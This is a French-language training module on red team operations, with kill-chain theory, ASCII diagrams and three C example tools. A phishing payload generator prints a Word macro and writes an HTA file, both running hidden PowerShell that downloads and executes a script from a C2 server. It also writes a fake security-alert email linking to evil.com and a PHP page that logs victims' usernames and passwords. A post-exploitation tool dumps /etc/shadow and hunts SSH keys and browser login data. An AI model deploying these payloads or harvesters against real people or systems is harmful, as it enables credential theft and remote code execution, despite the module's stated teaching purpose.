# Module 59 : Red Team Operations

## 🎯 Ce que tu vas apprendre

Dans ce module, tu vas maîtriser :
- Méthodologie complète d'engagement Red Team
- OSINT et reconnaissance avancée
- Phishing et social engineering
- Post-exploitation et lateral movement
- Reporting et documentation professionnelle
- Rules of Engagement (RoE)
- Éthique et responsabilité

## 📚 Théorie

### C'est quoi le Red Teaming ?

Le **Red Teaming** est une approche offensive de sécurité qui simule un attaquant réel (APT) pour tester les défenses d'une organisation. Contrairement au pentest, le Red Team :

- Utilise toutes les techniques d'un attaquant réel
- Teste la détection et la réponse (Blue Team)
- Opère furtivement sur une longue période
- Utilise social engineering et phishing
- Vise des objectifs business spécifiques

### Phases d'un engagement Red Team

1. **Planning & Scoping** : Définir les objectifs et limites
2. **Reconnaissance** : OSINT, enumération
3. **Initial Access** : Phishing, exploitation
4. **Execution** : Exécuter du code malveillant
5. **Persistence** : Maintenir l'accès
6. **Privilege Escalation** : Obtenir admin/root
7. **Defense Evasion** : Éviter la détection
8. **Credential Access** : Voler des identifiants
9. **Discovery** : Cartographier le réseau
10. **Lateral Movement** : Se déplacer dans le réseau
11. **Collection** : Collecter des données cibles
12. **Exfiltration** : Extraire les données
13. **Impact** : Objectif final (démonstration)
14. **Reporting** : Documentation complète

### MITRE ATT&CK Framework

Le **MITRE ATT&CK** est une base de connaissance des tactiques et techniques utilisées par les attaquants :

- **Tactics** : Objectif (ex: Initial Access)
- **Techniques** : Méthode (ex: Spearphishing)
- **Sub-techniques** : Variante spécifique
- **Procedures** : Implémentation concrète

## 🔍 Visualisation

### Red Team Kill Chain

```
┌─────────────────────────────────────────────────────┐
│           RED TEAM ATTACK CHAIN                     │
├─────────────────────────────────────────────────────┤
│                                                     │
│  1. Reconnaissance                                  │
│  ┌────────────────────────────────────┐            │
│  │ - OSINT (Google, LinkedIn, Shodan) │            │
│  │ - DNS enumeration                  │            │
│  │ - Subdomain discovery              │            │
│  │ - Email harvesting                 │            │
│  │ - Technology fingerprinting        │            │
│  └──────────────┬─────────────────────┘            │
│                 │                                   │
│                 ▼                                   │
│  2. Weaponization                                   │
│  ┌────────────────────────────────────┐            │
│  │ - Create malicious payload         │            │
│  │ - Obfuscate to evade AV            │            │
│  │ - Craft phishing emails            │            │
│  │ - Setup C2 infrastructure          │            │
│  └──────────────┬─────────────────────┘            │
│                 │                                   │
│                 ▼                                   │
│  3. Delivery                                        │
│  ┌────────────────────────────────────┐            │
│  │ - Spearphishing with attachment    │            │
│  │ - Watering hole attack             │            │
│  │ - USB drop                         │            │
│  │ - Supply chain compromise          │            │
│  └──────────────┬─────────────────────┘            │
│                 │                                   │
│                 ▼                                   │
│  4. Exploitation                                    │
│  ┌────────────────────────────────────┐            │
│  │ - User executes payload            │            │
│  │ - Exploit vulnerability            │            │
│  │ - Bypass UAC/AMSI                  │            │
│  │ - Execute in memory                │            │
│  └──────────────┬─────────────────────┘            │
│                 │                                   │
│                 ▼                                   │
│  5. Installation                                    │
│  ┌────────────────────────────────────┐            │
│  │ - Beacon to C2                     │            │
│  │ - Install persistence              │            │
│  │ - Deploy additional tools          │            │
│  └──────────────┬─────────────────────┘            │
│                 │                                   │
│                 ▼                                   │
│  6. Command & Control                               │
│  ┌────────────────────────────────────┐            │
│  │ - Encrypted C2 channel             │            │
│  │ - Domain fronting                  │            │
│  │ - Jitter to avoid patterns         │            │
│  └──────────────┬─────────────────────┘            │
│                 │                                   │
│                 ▼                                   │
│  7. Actions on Objectives                           │
│  ┌────────────────────────────────────┐            │
│  │ - Lateral movement                 │            │
│  │ - Privilege escalation             │            │
│  │ - Data collection                  │            │
│  │ - Exfiltration                     │            │
│  │ - Achieve mission objective        │            │
│  └────────────────────────────────────┘            │
│                                                     │
└─────────────────────────────────────────────────────┘
```

### Red Team vs Blue Team

```
┌─────────────────────────────────────────────────────┐
│         RED TEAM vs BLUE TEAM                       │
├─────────────────────────────────────────────────────┤
│                                                     │
│  Red Team (Attaquant)          Blue Team (Défenseur)│
│                                                     │
│  ┌──────────────────────┐     ┌──────────────────┐ │
│  │ Phishing email sent  ├────►│ Email filter     │ │
│  └──────────────────────┘     │ (missed)         │ │
│                                └────────┬─────────┘ │
│                                         │           │
│  ┌──────────────────────┐              ▼           │
│  │ User clicked link    │     ┌──────────────────┐ │
│  │ Payload executed     ├────►│ AV scan          │ │
│  └──────────────────────┘     │ (bypassed)       │ │
│                                └────────┬─────────┘ │
│                                         │           │
│  ┌──────────────────────┐              ▼           │
│  │ Beacon to C2         ├────►│ Firewall/IDS     │ │
│  │ (encrypted HTTPS)    │     │ (looks normal)   │ │
│  └──────────────────────┘     └────────┬─────────┘ │
│                                         │           │
│  ┌──────────────────────┐              ▼           │
│  │ Lateral movement     ├────►│ EDR alert        │ │
│  │ (using WMI)          │     │ (detected!)      │ │
│  └──────────────────────┘     └────────┬─────────┘ │
│                                         │           │
│                                         ▼           │
│                               ┌──────────────────┐ │
│                               │ SOC investigation│ │
│                               │ - Isolate host   │ │
│                               │ - Block C2       │ │
│                               │ - Hunt IOCs      │ │
│                               └──────────────────┘ │
│                                                     │
│  Objectif Red Team:                                 │
│  - Tester les défenses                             │
│  - Identifier les gaps                             │
│  - Former le Blue Team                             │
│                                                     │
└─────────────────────────────────────────────────────┘
```

## 💻 Exemple pratique

### Exemple 1 : OSINT et Reconnaissance

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void google_dorking(const char *target) {
    printf("[*] Google Dorking for: %s\n", target);

    const char *dorks[] = {
        "site:%s filetype:pdf",
        "site:%s inurl:admin",
        "site:%s inurl:login",
        "site:%s intext:password",
        "site:%s intitle:\"index of\"",
        "\"%s\" filetype:xls OR filetype:xlsx",
        "\"%s\" \"confidential\" OR \"internal\"",
        NULL
    };

    printf("\n[+] Google Dorks to try:\n");

    for (int i = 0; dorks[i] != NULL; i++) {
        char query[512];
        snprintf(query, sizeof(query), dorks[i], target);

        printf("  - %s\n", query);

        // Générer URL Google
        char url[1024];
        snprintf(url, sizeof(url),
                 "https://www.google.com/search?q=%s",
                 query);

        // Note: En pratique, utiliser un navigateur ou API
    }
}

void email_harvesting(const char *domain) {
    printf("[*] Email harvesting for domain: %s\n", domain);

    char cmd[512];

    // theharvester
    snprintf(cmd, sizeof(cmd),
             "theHarvester -d %s -b google,linkedin,bing",
             domain);

    printf("[*] Command: %s\n", cmd);
    printf("[*] This would collect emails from public sources\n");

    // hunter.io
    printf("\n[+] Alternative: hunter.io API\n");
    printf("    curl https://api.hunter.io/v2/domain-search?domain=%s\n", domain);
}

void subdomain_enumeration(const char *domain) {
    printf("[*] Subdomain enumeration for: %s\n", domain);

    // Amass
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "amass enum -d %s", domain);
    printf("[*] Amass: %s\n", cmd);

    // Subfinder
    snprintf(cmd, sizeof(cmd), "subfinder -d %s", domain);
    printf("[*] Subfinder: %s\n", cmd);

    // DNS brute force
    printf("\n[*] DNS brute force:\n");
    const char *wordlist = "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt";

    snprintf(cmd, sizeof(cmd),
             "while read sub; do "
             "  host $sub.%s | grep 'has address'; "
             "done < %s",
             domain, wordlist);

    printf("    %s\n", cmd);
}

void shodan_search(const char *organization) {
    printf("[*] Shodan search for: %s\n", organization);

    printf("\n[+] Search queries:\n");
    printf("  - org:\"%s\"\n", organization);
    printf("  - org:\"%s\" port:22\n", organization);
    printf("  - org:\"%s\" http.title:\"admin\"\n", organization);
    printf("  - ssl:\"%s\"\n", organization);

    printf("\n[*] Use: shodan.io or CLI tool\n");
}

void technology_fingerprinting(const char *url) {
    printf("[*] Technology fingerprinting: %s\n", url);

    char cmd[512];

    // Whatweb
    snprintf(cmd, sizeof(cmd), "whatweb %s", url);
    printf("[*] WhatWeb: %s\n", cmd);

    // Wappalyzer (browser extension)
    printf("[*] Wappalyzer: Use browser extension\n");

    // Manual headers
    snprintf(cmd, sizeof(cmd), "curl -I %s", url);
    printf("[*] Headers: %s\n", cmd);
}

int main(int argc, char *argv[]) {
    if (argc < 3) {
        printf("Usage:\n");
        printf("  %s google <target>\n", argv[0]);
        printf("  %s emails <domain>\n", argv[0]);
        printf("  %s subdomains <domain>\n", argv[0]);
        printf("  %s shodan <organization>\n", argv[0]);
        printf("  %s tech <url>\n", argv[0]);
        return 1;
    }

    printf("=== Red Team OSINT Tool ===\n\n");

    if (strcmp(argv[1], "google") == 0) {
        google_dorking(argv[2]);
    }
    else if (strcmp(argv[1], "emails") == 0) {
        email_harvesting(argv[2]);
    }
    else if (strcmp(argv[1], "subdomains") == 0) {
        subdomain_enumeration(argv[2]);
    }
    else if (strcmp(argv[1], "shodan") == 0) {
        shodan_search(argv[2]);
    }
    else if (strcmp(argv[1], "tech") == 0) {
        technology_fingerprinting(argv[2]);
    }
    else {
        printf("[-] Invalid command\n");
    }

    return 0;
}
```

### Exemple 2 : Générateur de payload phishing

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

void generate_macro_payload(const char *c2_server, int c2_port) {
    printf("[*] Generating VBA macro payload...\n");

    printf("\n=== VBA Macro (paste in Word document) ===\n");

    printf("Sub AutoOpen()\n");
    printf("    Dim cmd As String\n");
    printf("    cmd = \"powershell -nop -w hidden -c \"\n");
    printf("    cmd = cmd & \"IEX(New-Object Net.WebClient)\"\n");
    printf("    cmd = cmd & \".DownloadString('\"\n");
    printf("    cmd = cmd & \"http://%s:%d/payload.ps1')\"\n", c2_server, c2_port);
    printf("    Shell cmd, vbHide\n");
    printf("End Sub\n");

    printf("\n[+] Macro created. Save as .docm file\n");
}

void generate_hta_payload(const char *c2_server) {
    printf("[*] Generating HTA payload...\n");

    FILE *fp = fopen("payload.hta", "w");

    if (!fp) {
        perror("fopen");
        return;
    }

    fprintf(fp, "<html>\n");
    fprintf(fp, "<head>\n");
    fprintf(fp, "<script language=\"VBScript\">\n");
    fprintf(fp, "  Set objShell = CreateObject(\"WScript.Shell\")\n");
    fprintf(fp, "  objShell.Run \"powershell -nop -w hidden -c \"\n");
    fprintf(fp, "  objShell.Run \"IEX(New-Object Net.WebClient)\"\n");
    fprintf(fp, "  objShell.Run \".DownloadString('http://%s/shell.ps1')\"\n", c2_server);
    fprintf(fp, "  window.close()\n");
    fprintf(fp, "</script>\n");
    fprintf(fp, "</head>\n");
    fprintf(fp, "<body>\n");
    fprintf(fp, "<h1>Loading...</h1>\n");
    fprintf(fp, "</body>\n");
    fprintf(fp, "</html>\n");

    fclose(fp);

    printf("[+] payload.hta created\n");
    printf("[*] Host it and send link: mshta http://yourserver/payload.hta\n");
}

void generate_phishing_email() {
    printf("[*] Generating phishing email template...\n");

    FILE *fp = fopen("phishing_email.html", "w");

    if (!fp) {
        perror("fopen");
        return;
    }

    fprintf(fp, "Subject: Urgent: Security Update Required\n\n");

    fprintf(fp, "<html>\n");
    fprintf(fp, "<body>\n");
    fprintf(fp, "<p>Dear Employee,</p>\n\n");

    fprintf(fp, "<p>Our IT department has detected suspicious activity on your account. </p>\n");
    fprintf(fp, "<p>Please verify your credentials immediately to prevent account suspension.</p>\n\n");

    fprintf(fp, "<p><a href=\"http://evil.com/phish.php\">Click here to verify</a></p>\n\n");

    fprintf(fp, "<p>This link will expire in 24 hours.</p>\n\n");

    fprintf(fp, "<p>Best regards,<br>\n");
    fprintf(fp, "IT Security Team</p>\n");

    fprintf(fp, "</body>\n");
    fprintf(fp, "</html>\n");

    fclose(fp);

    printf("[+] phishing_email.html created\n");
    printf("[!] Remember: Only use in authorized Red Team engagements!\n");
}

void generate_credential_harvester() {
    printf("[*] Generating credential harvester page...\n");

    FILE *fp = fopen("phish.php", "w");

    if (!fp) {
        perror("fopen");
        return;
    }

    fprintf(fp, "<?php\n");
    fprintf(fp, "if ($_SERVER['REQUEST_METHOD'] == 'POST') {\n");
    fprintf(fp, "    $username = $_POST['username'];\n");
    fprintf(fp, "    $password = $_POST['password'];\n");
    fprintf(fp, "    \n");
    fprintf(fp, "    // Log credentials\n");
    fprintf(fp, "    $log = \"Username: $username | Password: $password\\n\";\n");
    fprintf(fp, "    file_put_contents('creds.txt', $log, FILE_APPEND);\n");
    fprintf(fp, "    \n");
    fprintf(fp, "    // Redirect to real site\n");
    fprintf(fp, "    header('Location: https://realsite.com/login');\n");
    fprintf(fp, "    exit;\n");
    fprintf(fp, "}\n");
    fprintf(fp, "?>\n");
    fprintf(fp, "<html>\n");
    fprintf(fp, "<head><title>Login</title></head>\n");
    fprintf(fp, "<body>\n");
    fprintf(fp, "<h2>Please Login</h2>\n");
    fprintf(fp, "<form method=\"post\">\n");
    fprintf(fp, "  Username: <input type=\"text\" name=\"username\"><br>\n");
    fprintf(fp, "  Password: <input type=\"password\" name=\"password\"><br>\n");
    fprintf(fp, "  <input type=\"submit\" value=\"Login\">\n");
    fprintf(fp, "</form>\n");
    fprintf(fp, "</body>\n");
    fprintf(fp, "</html>\n");

    fclose(fp);

    printf("[+] phish.php created\n");
    printf("[*] Host on your phishing server\n");
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage:\n");
        printf("  %s macro <c2_server> <c2_port>\n", argv[0]);
        printf("  %s hta <c2_server>\n", argv[0]);
        printf("  %s email\n", argv[0]);
        printf("  %s harvester\n", argv[0]);
        return 1;
    }

    printf("=== Phishing Payload Generator ===\n\n");

    if (strcmp(argv[1], "macro") == 0 && argc == 4) {
        generate_macro_payload(argv[2], atoi(argv[3]));
    }
    else if (strcmp(argv[1], "hta") == 0 && argc == 3) {
        generate_hta_payload(argv[2]);
    }
    else if (strcmp(argv[1], "email") == 0) {
        generate_phishing_email();
    }
    else if (strcmp(argv[1], "harvester") == 0) {
        generate_credential_harvester();
    }
    else {
        printf("[-] Invalid arguments\n");
    }

    return 0;
}
```

### Exemple 3 : Post-Exploitation Framework

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void enumerate_system() {
    printf("[*] System enumeration...\n\n");

    printf("[+] Hostname:\n");
    system("hostname");

    printf("\n[+] Current user:\n");
    system("whoami");

    printf("\n[+] User groups:\n");
    system("groups");

    printf("\n[+] OS info:\n");
    system("uname -a");

    printf("\n[+] Network interfaces:\n");
    system("ifconfig");

    printf("\n[+] Routing table:\n");
    system("route -n");

    printf("\n[+] ARP table:\n");
    system("arp -a");

    printf("\n[+] Running processes:\n");
    system("ps aux");

    printf("\n[+] Listening ports:\n");
    system("netstat -tulpn");
}

void enumerate_users() {
    printf("[*] User enumeration...\n\n");

    printf("[+] /etc/passwd:\n");
    system("cat /etc/passwd");

    printf("\n[+] Logged in users:\n");
    system("w");

    printf("\n[+] Recent logins:\n");
    system("last -n 20");

    printf("\n[+] Sudo users:\n");
    system("cat /etc/sudoers 2>/dev/null || echo 'No access'");
}

void find_sensitive_files() {
    printf("[*] Searching for sensitive files...\n\n");

    printf("[+] SSH keys:\n");
    system("find / -name 'id_rsa*' 2>/dev/null");

    printf("\n[+] Config files with passwords:\n");
    system("find / -name '*.conf' -exec grep -l 'password' {} \\; 2>/dev/null | head -20");

    printf("\n[+] Database files:\n");
    system("find / -name '*.db' -o -name '*.sqlite' 2>/dev/null | head -20");

    printf("\n[+] History files:\n");
    system("find /home -name '.*_history' 2>/dev/null");
}

void dump_credentials() {
    printf("[*] Dumping credentials...\n\n");

    printf("[+] /etc/shadow (requires root):\n");
    system("cat /etc/shadow 2>/dev/null || echo 'No access'");

    printf("\n[+] Browser passwords:\n");
    system("find /home -path '*/.config/google-chrome/*/Login Data' 2>/dev/null");

    printf("\n[+] SSH config:\n");
    system("find /home -name 'config' -path '*/.ssh/*' 2>/dev/null");
}

void lateral_movement_scan() {
    printf("[*] Scanning for lateral movement opportunities...\n\n");

    printf("[+] Network hosts:\n");
    system("arp -a | awk '{print $2}' | tr -d '()'");

    printf("\n[+] Open SMB shares:\n");
    system("smbclient -L //192.168.1.1 -N 2>/dev/null || echo 'Install smbclient'");

    printf("\n[+] SSH accessible hosts:\n");
    printf("    (Use nmap or manual testing)\n");
}

void privilege_escalation_check() {
    printf("[*] Privilege escalation checks...\n\n");

    printf("[+] SUID binaries:\n");
    system("find / -perm -4000 2>/dev/null");

    printf("\n[+] World-writable files:\n");
    system("find / -perm -2 -type f 2>/dev/null | head -20");

    printf("\n[+] Cron jobs:\n");
    system("cat /etc/crontab");
    system("ls -la /etc/cron.*");

    printf("\n[+] Sudo permissions:\n");
    system("sudo -l 2>/dev/null || echo 'No sudo access'");
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage:\n");
        printf("  %s sysinfo\n", argv[0]);
        printf("  %s users\n", argv[0]);
        printf("  %s files\n", argv[0]);
        printf("  %s creds\n", argv[0]);
        printf("  %s lateral\n", argv[0]);
        printf("  %s privesc\n", argv[0]);
        printf("  %s all\n", argv[0]);
        return 1;
    }

    printf("=== Post-Exploitation Framework ===\n\n");

    if (strcmp(argv[1], "sysinfo") == 0) {
        enumerate_system();
    }
    else if (strcmp(argv[1], "users") == 0) {
        enumerate_users();
    }
    else if (strcmp(argv[1], "files") == 0) {
        find_sensitive_files();
    }
    else if (strcmp(argv[1], "creds") == 0) {
        dump_credentials();
    }
    else if (strcmp(argv[1], "lateral") == 0) {
        lateral_movement_scan();
    }
    else if (strcmp(argv[1], "privesc") == 0) {
        privilege_escalation_check();
    }
    else if (strcmp(argv[1], "all") == 0) {
        enumerate_system();
        enumerate_users();
        find_sensitive_files();
        dump_credentials();
        lateral_movement_scan();
        privilege_escalation_check();
    }
    else {
        printf("[-] Invalid command\n");
    }

    return 0;
}
```

## 📝 Points clés à retenir

1. **OSINT** : Toujours commencer par la reconnaissance passive
2. **Phishing** : Vecteur d'accès initial le plus courant
3. **Post-exploitation** : Énumérer avant d'agir
4. **Furtivité** : Éviter la détection à chaque étape
5. **Documentation** : Tracker toutes les actions et findings

### Checklist Red Team Engagement

```
Phase              Actions                            Statut
──────────────────────────────────────────────────────────────
Planning          - Define scope                      □
                  - Sign RoE                          □
                  - Setup infrastructure              □

OSINT             - Google dorking                    □
                  - Email harvesting                  □
                  - Subdomain enum                    □
                  - Shodan/Censys                     □

Weaponization     - Create payloads                   □
                  - Obfuscate code                    □
                  - Setup C2                          □

Delivery          - Phishing campaign                 □
                  - Social engineering                □

Exploitation      - Initial access                    □
                  - Persistence                       □

Post-Exploit      - Enumerate system                  □
                  - Dump credentials                  □
                  - Lateral movement                  □
                  - Achieve objectives                □

Cleanup           - Remove artifacts                  □
                  - Document timeline                 □

Reporting         - Executive summary                 □
                  - Technical details                 □
                  - Remediation advice                □
```

### Rules of Engagement (RoE)

**CRITICAL** : Toujours respecter les RoE :

1. **Scope** : Ne tester QUE les systèmes autorisés
2. **Timing** : Respecter les fenêtres de test
3. **Techniques** : Éviter DoS sauf autorisation explicite
4. **Données** : Ne PAS exfiltrer de vraies données sensibles
5. **Notification** : Contact d'urgence si problème critique

## ➡️ Prochaine étape

Maintenant que tu maîtrises les Red Team Operations, tu es prêt pour le **Module 60 : Blue Team & Detection**, où tu apprendras le point de vue défensif : détecter les intrusions, analyser les logs, et répondre aux incidents.

### Ce que tu as appris
- Méthodologie Red Team complète
- OSINT et reconnaissance
- Génération de payloads phishing
- Post-exploitation systematique
- Documentation d'engagement

### Ce qui t'attend
- Détection d'intrusions (SIEM, IDS)
- Analyse de logs
- Threat hunting
- Incident response
- SOC operations
- Blue Team tools
